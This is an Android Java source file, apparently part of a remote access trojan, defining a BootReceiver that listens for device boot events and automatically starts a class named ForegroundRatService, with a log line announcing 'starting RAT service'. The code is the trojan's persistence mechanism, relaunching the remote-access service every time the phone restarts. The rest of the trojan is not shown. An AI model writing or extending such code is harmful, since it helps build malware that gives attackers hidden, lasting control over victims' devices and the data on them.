package com.nullx.sta;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction())) {
            Log.d("BootReceiver", "Boot completed, starting RAT service...");
            Intent serviceIntent = new Intent(context, ForegroundRatService.class);
            context.startService(serviceIntent);
        }
    }
}